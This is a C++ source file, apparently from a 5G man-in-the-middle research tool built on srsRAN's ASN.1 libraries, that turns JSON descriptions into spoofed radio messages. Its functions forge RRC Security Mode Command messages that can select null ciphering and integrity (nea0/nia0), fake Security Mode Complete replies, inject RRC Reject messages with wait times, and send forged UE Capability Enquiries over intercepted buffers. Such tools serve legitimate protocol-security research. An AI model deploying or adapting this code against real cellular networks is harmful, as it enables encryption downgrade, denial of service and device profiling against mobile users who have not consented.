#include "json_packet_maker.h"
#include "rapidjson/document.h"
#include "rapidjson/writer.h"
#include "rapidjson/stringbuffer.h"
#include "mitm_lib/asn1/rrc_nr.h"
#include "mitm_lib/asn1/rrc_nr_utils.h"
#include "mitm_lib/common/byte_buffer.h"
#include "mitm_lib/common/common_nr.h"
#include "mitm_lib/asn1/nas_5g_msg.h"
#include "mitm_lib/asn1/nas_5g_ies.h"
#include "mitm_lib/asn1/nas_5g_utils.h"

using namespace rapidjson;

uint8_t msg_buffer_bytes[65535];
uint8_t* jsonPacketMaker::json_to_packet(std::string buf, uint8_t* original_msg, int size) {
  
  Document d;
  //d.Parse(json_buffer->to_string().c_str());
  d.Parse(buf.c_str());

  // RRC Messages
  const char* rrcSecurityModeComplete = "securityModeComplete";

  const char* rrcSecurityModeCommand = "securityModeCommand";
  const char* securityConfigSMC = "securityConfigSMC";
  const char* lateNonCriticalExtension = "lateNonCriticalExtension";
  const char* nonCriticalExtension = "nonCriticalExtension";
  const char* ciphering_algorithm = "cipheringAlgorithm";

  const char* rrcReject = "rrcReject";
  const char* rrcUeCapEnquiry = "ueCapabilityEnquiry";

  // NAS
  const char* dlInfoTransfer = "dlInformationTransfer";

  const char* criticalExtension = "criticalExtensions";
  const char* rat_type = "rat-Type";

  int rrcTransactionIdentifier = 0;
  std::string cipheringAlgorithm = "";
  std::string integrityAlgorithm = "";
  std::string lateNonCritExts = "";

  uint8_t waitTime = 0;
  std::string ratType = "";
  std::string capReqFilter = "";

  for (Value::ConstValueIterator itrr = d.Begin(); itrr != d.End(); ++itrr) {
    const Value& o = *itrr;

  for (Value::ConstValueIterator itr = o.Begin(); itr != o.End(); ++itr) {
    const Value& obj = *itr;
    for(Value::ConstMemberIterator direction = obj.MemberBegin(); direction != obj.MemberEnd(); ++direction){
      std::cout << direction->name.GetString() << ": ";

      const Value& obj2 = direction->value;
      for(Value::ConstMemberIterator msg = obj2.MemberBegin(); msg != obj2.MemberEnd(); ++msg) {
         std::cout << msg->name.GetString() << ": ";

         const Value& obj3 = msg->value;
         for(Value::ConstMemberIterator c1 = obj3.MemberBegin(); c1 != obj3.MemberEnd(); ++c1) {
           std::cout << c1->name.GetString() << ": ";

           const Value& obj4 = c1->value;
           for(Value::ConstMemberIterator msgType = obj4.MemberBegin(); msgType != obj4.MemberEnd(); ++msgType) {
             std::cout << msgType->name.GetString() << ": ";

	     const Value& obj5 = msgType->value;
	     for(Value::ConstMemberIterator contents = obj5.MemberBegin(); contents != obj5.MemberEnd(); ++contents) {
               std::cout << contents->name.GetString() << ": ";

	       if (strcmp(criticalExtension, contents->name.GetString()) != 0) {
                 std::cout << contents->value.GetInt() << ": ";
	         rrcTransactionIdentifier = contents->value.GetInt();
	       }

	       else {
	         const Value& obj6 = contents->value;

	         for(Value::ConstMemberIterator content = obj6.MemberBegin(); content != obj6.MemberEnd(); ++content) {
	           std::cout << content->name.GetString() << ": ";

	           if (strcmp(rrcSecurityModeComplete, content->name.GetString()) == 0) { // If RRC Security Mode Complete
                     std::cout << buf << std::endl;
		     handle_rrc_security_mode_complete(original_msg, rrcTransactionIdentifier, size);
		  }

		   else if (strcmp(rrcSecurityModeCommand, content->name.GetString()) == 0) { // If RRC Security Mode Command
		     std::cout << buf << std::endl;
		     const Value& obj7 = content->value;

		     for(Value::ConstMemberIterator smc = obj7.MemberBegin(); smc != obj7.MemberEnd(); ++smc) {
		       if (strcmp(securityConfigSMC, smc->name.GetString()) == 0) {
                       std::cout << smc->name.GetString() << ": ";

		       const Value& obj8 = smc->value;

		       for(Value::ConstMemberIterator algorithms = obj8.MemberBegin(); algorithms != obj8.MemberEnd(); ++algorithms) {
		       std::cout << algorithms->name.GetString() << ": ";

		       const Value& obj9 = algorithms->value;

		       for(Value::ConstMemberIterator algorithm = obj9.MemberBegin(); algorithm != obj9.MemberEnd(); ++algorithm) {

		       std::cout << algorithm->value.GetString() << ": ";

		       if (strcmp(ciphering_algorithm, algorithm->name.GetString()) != 0) {
			 integrityAlgorithm = algorithm->value.GetString();
			 if (smc+1 == obj7.MemberEnd()) {
                           handle_rrc_security_mode_command(original_msg, rrcTransactionIdentifier, cipheringAlgorithm, integrityAlgorithm, false, "n", size);
			 }
		       }

		       else {
		         cipheringAlgorithm = algorithm->value.GetString();
		       }

		       }
		       }
		     } else if (strcmp(lateNonCriticalExtension, smc->name.GetString()) == 0) {
		       std::cout << smc->name.GetString() << ": ";
		       lateNonCritExts = smc->value.GetString();
		       if (smc+1 == obj7.MemberEnd()) {
                         handle_rrc_security_mode_command(original_msg, rrcTransactionIdentifier, cipheringAlgorithm, integrityAlgorithm, false, lateNonCritExts, size);
		       }
		     } else if (strcmp(nonCriticalExtension, smc->name.GetString()) == 0) {
                       std::cout << smc->name.GetString() << ": ";
		       if (smc+1 == obj7.MemberEnd()) {
                         handle_rrc_security_mode_command(original_msg, rrcTransactionIdentifier, cipheringAlgorithm, integrityAlgorithm, true, lateNonCritExts, size);
		       }
		     }
		     }
		   }

		   else if (strcmp(rrcReject, content->name.GetString()) == 0) { // If RRC Reject
	             std::cout << buf << std::endl;
		     const Value& obj7 = content->value;

		     for(Value::ConstMemberIterator time = obj7.MemberBegin(); time != obj7.MemberEnd(); ++time) {
                       std::cout << time->name.GetString() << ": ";
		       waitTime = time->value.GetInt();
		       handle_rrc_reject(original_msg, waitTime, size);
		     }
		   }
                   
		   else if (strcmp(rrcUeCapEnquiry, content->name.GetString()) == 0) { // If RRC UE Capability Enquiry
	             std::cout << buf << std::endl;
		     const Value& obj7 = content->value;

		     //for(Value::ConstValueIterator reqLists = obj7.Begin(); reqLists != obj7.End(); ++reqLists) {
		     for(Value::ConstMemberIterator reqLists = obj7.MemberBegin(); reqLists != obj7.MemberEnd(); ++reqLists) {
                       std::cout << reqLists->name.GetString() << ": ";

		       const Value& obj8 = reqLists->value;
		       for(Value::ConstValueIterator reqList = obj8.Begin(); reqList != obj8.End(); ++reqList) {
                         //std::cout << reqList->name.GetString() << ": ";
			 const Value& obj9 = *reqList;
			 for(Value::ConstMemberIterator req = obj9.MemberBegin(); req != obj9.MemberEnd(); ++req) {
                           std::cout << req->name.GetString() << ": ";
                           std::cout << req->value.GetString() << ": ";

			   if (strcmp(rat_type, req->name.GetString()) != 0) {
                             capReqFilter = req->value.GetString();
			     handle_rrc_ue_cap_enquiry(original_msg, rrcTransactionIdentifier, ratType, capReqFilter, size);
			   }
			   else {
                             ratType = req->value.GetString();
			   }
			 }

		       }
		     }

		   }

		   else if (strcmp(dlInfoTransfer, content->name.GetString()) == 0) { // If DL Info Transfer (NAS)
	             std::cout << buf << std::endl;
		     uint8_t* MAC;
		     int sn = 0;
		     handle_nas_security_mode_command(original_msg, rrcTransactionIdentifier, MAC, sn, size);
		   }

		   //else {
                   //  handle_rrc_reject(16, 100);
		   //}
        	}
              }
            }
          }
        }
      }
    }
  }
  }

  std::cout << "\n";

  return msg_buffer_bytes;
}

void jsonPacketMaker::handle_rrc_security_mode_complete(uint8_t* original_msg, int rrcTransactionIdentifier, int size) {
  struct msg_struct {
    uint32_t channel;
    uint8_t msg[32768];
  } msg_buffer;
  
  std::cout << "\n" << std::endl;
  std::cout << "Spoofing RRC Security Mode Complete" << std::endl;
  std::cout << "RRC Transaction Identifier: " << rrcTransactionIdentifier << std::endl;

  asn1::rrc_nr::ul_dcch_msg_s ul_dcch_msg;
  auto& smc = ul_dcch_msg.msg.set_c1().set_security_mode_complete();
  smc.rrc_transaction_id = rrcTransactionIdentifier;
  smc.crit_exts.set_security_mode_complete();

  //asn1::json_writer *json_buf = new asn1::json_writer();
  //ul_dcch_msg.to_json(*json_buf);
  //std::cout << json_buf->to_string() << std::endl;

  asn1::rrc_nr::ul_dcch_msg_s& msg = ul_dcch_msg;
  srsran::unique_byte_buffer_t pdu = srsran::make_byte_buffer();
  if (pdu == nullptr) {
    std::cout << "pdu creation failed" << std::endl;
  }

  asn1::bit_ref bref(pdu->msg, pdu->get_tailroom());
  msg.pack(bref);
  bref.align_bytes_zero();
  pdu->N_bytes = (uint32_t)bref.distance_bytes(pdu->msg);
  pdu->set_timestamp();

  memcpy(&msg_buffer, original_msg, size);

  //msg_buffer.channel = srsran::srb_to_lcid(srsran::nr_srb::srb1);
  //msg_buffer.channel = buf.channel;
  memcpy(msg_buffer.msg, pdu->msg, pdu->N_bytes);

  //uint8_t msg_buffer_bytes[65535];
  //msg_buffer_bytes = reinterpret_cast<uint8_t*>(&msg_buffer);
  memcpy(msg_buffer_bytes, &msg_buffer, size);

  for (int i=0; i<size; i++) {
    std::cout << std::to_string(msg_buffer_bytes[i]) << " ";
  }
  std::cout << "\n";
}

void jsonPacketMaker::handle_rrc_security_mode_command(uint8_t* original_msg, int rrcTransactionIdentifier, std::string cipheringAlgorithm, std::string integrityAlgorithm, bool non_crit_ext_present, std::string late_non_crit_ext, int size) {
  struct msg_struct {
    uint32_t channel;
    uint8_t msg[32768];
  } msg_buffer;

  std::cout << "\n" << std::endl;
  std::cout << "Spoofing RRC Security Mode Command" << std::endl;
  std::cout << "RRC Transaction Identifier: " << rrcTransactionIdentifier << std::endl;
  std::cout << "Ciphering Algorithm: " << cipheringAlgorithm << std::endl;
  std::cout << "Integrity Algorithm: " << integrityAlgorithm << std::endl;
  std::cout << "Non Critical Extension Present: " << non_crit_ext_present << std::endl;
  std::cout << "Late Non Critical Extension: " << late_non_crit_ext << std::endl;

  asn1::rrc_nr::dl_dcch_msg_s dl_dcch_msg;
  dl_dcch_msg.msg.set_c1().set_security_mode_cmd().rrc_transaction_id = rrcTransactionIdentifier;
  asn1::rrc_nr::security_mode_cmd_ies_s& ies = dl_dcch_msg.msg.c1().security_mode_cmd().crit_exts.set_security_mode_cmd();

  ies.security_cfg_smc.security_algorithm_cfg.integrity_prot_algorithm_present = true;

  if (cipheringAlgorithm.compare("nea0") == 0) {
    ies.security_cfg_smc.security_algorithm_cfg.ciphering_algorithm = (asn1::rrc_nr::ciphering_algorithm_e::options)0;
  } else if (cipheringAlgorithm.compare("nea1") == 0) {
    ies.security_cfg_smc.security_algorithm_cfg.ciphering_algorithm = (asn1::rrc_nr::ciphering_algorithm_e::options)1;
  } else if (cipheringAlgorithm.compare("nea2") == 0) {
    ies.security_cfg_smc.security_algorithm_cfg.ciphering_algorithm = (asn1::rrc_nr::ciphering_algorithm_e::options)2;
  } else if (cipheringAlgorithm.compare("nea3") == 0) {
    ies.security_cfg_smc.security_algorithm_cfg.ciphering_algorithm = (asn1::rrc_nr::ciphering_algorithm_e::options)3;
  }

  if (integrityAlgorithm.compare("nia0") == 0) {
    ies.security_cfg_smc.security_algorithm_cfg.integrity_prot_algorithm = (asn1::rrc_nr::integrity_prot_algorithm_e::options)0;
  } else if (integrityAlgorithm.compare("nia1") == 0) {
    ies.security_cfg_smc.security_algorithm_cfg.integrity_prot_algorithm = (asn1::rrc_nr::integrity_prot_algorithm_e::options)1;
  } else if (integrityAlgorithm.compare("nia2") == 0) {
    ies.security_cfg_smc.security_algorithm_cfg.integrity_prot_algorithm = (asn1::rrc_nr::integrity_prot_algorithm_e::options)2;
  } else if (integrityAlgorithm.compare("nia3") == 0) {
    ies.security_cfg_smc.security_algorithm_cfg.integrity_prot_algorithm = (asn1::rrc_nr::integrity_prot_algorithm_e::options)3;
  }

  if (non_crit_ext_present) {
    ies.non_crit_ext_present = true;
  }

  if (late_non_crit_ext.compare("n") != 0) {
    ies.late_non_crit_ext.from_string(late_non_crit_ext);
  }

  asn1::rrc_nr::dl_dcch_msg_s& msg = dl_dcch_msg;
  srsran::unique_byte_buffer_t pdu = srsran::make_byte_buffer();
  if (pdu == nullptr) {
    std::cout << "pdu creation failed" << std::endl;
  }
  //srsran::unique_byte_buffer_t pdu = srsran::pack_into_pdu(dl_dcch_msg);
  
  asn1::json_writer *json_buf = new asn1::json_writer();
  dl_dcch_msg.to_json(*json_buf);
  std::cout << json_buf->to_string() << std::endl;

  asn1::bit_ref bref(pdu->msg, pdu->get_tailroom());
  msg.pack(bref);
  bref.align_bytes_zero();
  pdu->N_bytes = (uint32_t)bref.distance_bytes(pdu->msg);
  pdu->set_timestamp();

  memcpy(&msg_buffer, original_msg, size);
  memcpy(msg_buffer.msg, pdu->msg, pdu->N_bytes);
  memcpy(msg_buffer_bytes, &msg_buffer, size);

  for (int i=0; i<size; i++) {
    std::cout << std::to_string(msg_buffer_bytes[i]) << " ";
  }
  std::cout << "\n";
}

void jsonPacketMaker::handle_rrc_reject(uint8_t* original_msg, uint8_t waitTime, int size) {
  struct msg_struct {
    uint32_t channel;
    uint8_t msg[32768];
  } msg_buffer;

  std::cout << "\n" << std::endl;
  std::cout << "Spoofing RRC Reject" << std::endl;
  std::cout << "RRC Reject Max Wait Time: " << waitTime << std::endl;

  asn1::rrc_nr::dl_ccch_msg_s dl_ccch_msg;
  asn1::rrc_nr::rrc_reject_ies_s& reject = dl_ccch_msg.msg.set_c1().set_rrc_reject().crit_exts.set_rrc_reject();

  // See TS 38.331, RejectWaitTime
  if (waitTime > 0) {
    reject.wait_time_present = true;
    reject.wait_time         = waitTime;
  }

  asn1::rrc_nr::dl_ccch_msg_s& msg = dl_ccch_msg;
  srsran::unique_byte_buffer_t pdu = srsran::make_byte_buffer();
  if (pdu == nullptr) {
    std::cout << "pdu creation failed" << std::endl;
  }

  asn1::json_writer *json_buf = new asn1::json_writer();
  dl_ccch_msg.to_json(*json_buf);
  std::cout << json_buf->to_string() << std::endl;

  asn1::bit_ref bref(pdu->msg, pdu->get_tailroom());
  msg.pack(bref);
  bref.align_bytes_zero();
  pdu->N_bytes = (uint32_t)bref.distance_bytes(pdu->msg);
  pdu->set_timestamp();

  memcpy(&msg_buffer, original_msg, size);
  memcpy(msg_buffer.msg, pdu->msg, pdu->N_bytes);
  memcpy(msg_buffer_bytes, &msg_buffer, size);

  for (int i=0; i<size; i++) {
    std::cout << std::to_string(msg_buffer_bytes[i]) << " ";
  }
  std::cout << "\n";
}

void jsonPacketMaker::handle_rrc_ue_cap_enquiry(uint8_t* original_msg, int rrcTransactionIdentifier, std::string ratType, std::string capReqFilter, int size) {
  struct msg_struct {
    uint32_t channel;
    uint8_t msg[32768];
  } msg_buffer;

  std::cout << "\n" << std::endl;
  std::cout << "Spoofing RRC UE Cap Enquiry" << std::endl;
  std::cout << "RRC Transaction Identifier: " << rrcTransactionIdentifier << std::endl;
  std::cout << "RAT Type: " << ratType << std::endl;
  std::cout << "Capability Request Filter: " << capReqFilter << std::endl;

  asn1::rrc_nr::dl_dcch_msg_s dl_dcch_msg;
  dl_dcch_msg.msg.set_c1().set_ue_cap_enquiry().rrc_transaction_id = rrcTransactionIdentifier;
  asn1::rrc_nr::ue_cap_enquiry_ies_s& ies = dl_dcch_msg.msg.c1().ue_cap_enquiry().crit_exts.set_ue_cap_enquiry();

  // ue-CapabilityRAT-RequestList
  asn1::rrc_nr::ue_cap_rat_request_s cap_rat_request;

  if (ratType.compare("nr") == 0) {
    cap_rat_request.rat_type.value = asn1::rrc_nr::rat_type_opts::nr;
  } else if (ratType.compare("eutra_nr") == 0) {
    cap_rat_request.rat_type.value = asn1::rrc_nr::rat_type_opts::eutra_nr;
  } else if (ratType.compare("eutra") == 0) {
    cap_rat_request.rat_type.value = asn1::rrc_nr::rat_type_opts::eutra;
  } else if (ratType.compare("spare1") == 0) {
    cap_rat_request.rat_type.value = asn1::rrc_nr::rat_type_opts::spare1;
  } else {
    cap_rat_request.rat_type.value = asn1::rrc_nr::rat_type_opts::nulltype;
  }

  // capabilityRequestFilter
  //ue_cap_request_filt_nr_s request_filter;
  cap_rat_request.cap_request_filt.from_string(capReqFilter);

  ies.ue_cap_rat_request_list.push_back(cap_rat_request);

  asn1::rrc_nr::dl_dcch_msg_s& msg = dl_dcch_msg;
  srsran::unique_byte_buffer_t pdu = srsran::make_byte_buffer();
  if (pdu == nullptr) {
    std::cout << "pdu creation failed" << std::endl;
  }
  //srsran::unique_byte_buffer_t pdu = srsran::pack_into_pdu(dl_dcch_msg);
  
  asn1::json_writer *json_buf = new asn1::json_writer();
  dl_dcch_msg.to_json(*json_buf);
  std::cout << json_buf->to_string() << std::endl;

  asn1::bit_ref bref(pdu->msg, pdu->get_tailroom());
  msg.pack(bref);
  bref.align_bytes_zero();
  pdu->N_bytes = (uint32_t)bref.distance_bytes(pdu->msg);
  pdu->set_timestamp();

  memcpy(&msg_buffer, original_msg, size);
  memcpy(msg_buffer.msg, pdu->msg, pdu->N_bytes);
  memcpy(msg_buffer_bytes, &msg_buffer, size);

  for (int i=0; i<size; i++) {
    std::cout << std::to_string(msg_buffer_bytes[i]) << " ";
  }
  std::cout << "\n";
}

void jsonPacketMaker::handle_nas_security_mode_command(uint8_t* original_msg, int rrcTransactionIdentifier, uint8_t* MAC, int sn, int size) {
  struct msg_struct {
    uint32_t channel;
    uint8_t msg[32768];
  } msg_buffer;

  std::cout << "\n";
  std::cout << "Spoofing NAS Security Mode Command" << std::endl;
  std::cout << "RRC Transaction Identifier: " << rrcTransactionIdentifier << std::endl;
  std::cout << "Message Authentication Code: " << MAC << std::endl;
  std::cout << "Sequence Number: " << sn << std::endl;
  std::cout << "\n";
  
  srsran::unique_byte_buffer_t pdu = srsran::make_byte_buffer();
  if (pdu == nullptr) {
    std::cout << "pdu creation failed" << std::endl;
  }
  asn1::bit_ref msg_bref(pdu->msg, pdu->get_tailroom());

  srsran::nas_5g::nas_5gs_hdr hdr;
  srslog::detail::any msg_container = srslog::detail::any{srsran::nas_5g::security_mode_command_t()};
  srsran::nas_5g::security_mode_command_t* msg = srslog::detail::any_cast<srsran::nas_5g::security_mode_command_t>(&msg_container);
  
  hdr.pack(msg_bref);
  msg->pack(msg_bref);

  asn1::json_writer *json_buf = new asn1::json_writer();
  hdr.to_json(*json_buf);
  msg->to_json(*json_buf);
  std::cout << json_buf->to_string() << std::endl;
}

/*
void jsonPacketMaker::handle_rrc_reject(uint8_t waitTime, int size) {
  struct msg_struct {
    uint32_t channel;
    uint8_t msg[32768];
  } msg_buffer;

  std::cout << "\n" << std::endl;
  std::cout << "Spoofing RRC Reject" << std::endl;
  std::cout << "RRC Reject Max Wait Time: " << waitTime << std::endl;

  asn1::rrc_nr::dl_ccch_msg_s dl_ccch_msg;
  asn1::rrc_nr::rrc_reject_ies_s& reject = dl_ccch_msg.msg.set_c1().set_rrc_reject().crit_exts.set_rrc_reject();

  // See TS 38.331, RejectWaitTime
  if (waitTime > 0) {
    reject.wait_time_present = true;
    reject.wait_time         = waitTime;
  }

  asn1::rrc_nr::dl_ccch_msg_s& msg = dl_ccch_msg;
  srsran::unique_byte_buffer_t pdu = srsran::make_byte_buffer();
  if (pdu == nullptr) {
    std::cout << "pdu creation failed" << std::endl;
  }

  asn1::json_writer *json_buf = new asn1::json_writer();
  dl_ccch_msg.to_json(*json_buf);
  std::cout << json_buf->to_string() << std::endl;

  asn1::bit_ref bref(pdu->msg, pdu->get_tailroom());
  msg.pack(bref);
  bref.align_bytes_zero();
  pdu->N_bytes = (uint32_t)bref.distance_bytes(pdu->msg);
  pdu->set_timestamp();

  memcpy(msg_buffer.msg, pdu->msg, pdu->N_bytes);
  memcpy(msg_buffer_bytes, &msg_buffer, size);

  for (int i=0; i<size; i++) {
    std::cout << std::to_string(msg_buffer_bytes[i]) << " ";
  }
  std::cout << "\n";
}
*/
